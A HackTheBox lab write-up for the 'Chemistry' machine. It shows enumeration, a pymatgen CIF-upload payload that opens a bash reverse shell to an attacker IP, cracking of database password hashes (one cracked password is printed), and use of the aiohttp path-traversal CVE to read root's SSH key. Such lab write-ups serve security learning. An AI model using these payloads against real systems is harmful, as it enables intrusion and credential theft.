---
layout: writeup
name: "chemistry"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
date: 2025-11-12
pwned: true
---
# Hack The Box - Chemistry (10.10.11.38)

## Overview
**Chemistry** is a medium-difficulty Linux machine on Hack The Box. It leverages a file upload vulnerability in the `pymatgen` library, weak password reuse, and a local file inclusion in an aiohttp service to ultimately gain root access.

---

## 🔍 Enumeration

### Nmap Scan
```bash
nmap -p- chemistry.htb --min-rate 10000
```
**Open ports:**
- `22/tcp` - OpenSSH 8.2
- `5000/tcp` - Werkzeug HTTP server (Python 3.9.5)

```bash
nmap -p 22,5000 chemistry.htb -sCV -oN nmapscan -T5
```
**Notable results:**
- Werkzeug web app with title: `Chemistry - Home`

---

## 🌐 Web Enumeration
Accessing port **5000**, we find a web interface that allows uploading `.cif` (Crystallographic Information Format) files for analysis.

Attempted SQLi on login: `admin' OR 1=1 LIMIT 1;-- -` → Failed.

Example `.cif` file provided:
```
_cell_length_a    10.00000
loop_
 _atom_site_label
 _atom_site_fract_x
...
```

---

## ⚙️ Exploitation - RCE via CIF Upload

Research revealed a known vuln in `pymatgen`: [GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

Uploaded `.cif` with:
```python
[().__class__.__mro__[1].__subclasses__()...].load_module("os").system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/1331 0>&1'")
```

Result: Reverse shell as user `app`

---

## 🐚 Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

---

## 🔍 Post-Exploitation - SQLite Hash Dump
Found: `/home/app/instance/database.db`

```bash
sqlite3 database.db
.tables
SELECT * FROM user;
```
Extracted user hashes → Cracked with CrackStation
- `rosa:unicorniosrosados` ✅

---

## 🔐 SSH as Rosa
```bash
ssh rosa@chemistry.htb
```
Got shell as `rosa`, no sudo privileges.

---

## 🕵️‍♀️ Privilege Escalation - LFI via aiohttp

Discovered `localhost:8080` running aiohttp.
```bash
ss -tuln | grep 8080
ssh -L 8081:127.0.0.1:8080 rosa@chemistry.htb
```

**CVE-2024-23334** → aiohttp LFI exploit:
- [PoC Script](https://raw.githubusercontent.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC/main/lfi_aiohttp.sh)

Used to read:
- `/root/root.txt`
- `/root/.ssh/id_rsa`

---

## 🧑‍💻 Root Access
```bash
ssh -i id_rsa root@localhost
```

---

## ✅ Summary
| Stage              | Technique                                       |
|-------------------|-------------------------------------------------|
| Foothold          | RCE via CIF upload (`pymatgen` vuln)            |
| User Escalation   | Cracked password from SQLite DB                 |
| Privilege Escalation | LFI in aiohttp (CVE-2024-23334)              |
| Root Access       | SSH via dumped `/root/.ssh/id_rsa`              |

---

## 🧠 Lessons Learned
- Always validate file parsing libraries for RCE vectors.
- aiohttp's path handling (pre-3.9.2) can be abused for LFI.
- Weak password reuse between DB and system accounts = easy win.

---

Report by inksec – https://github.com/inkedqt/
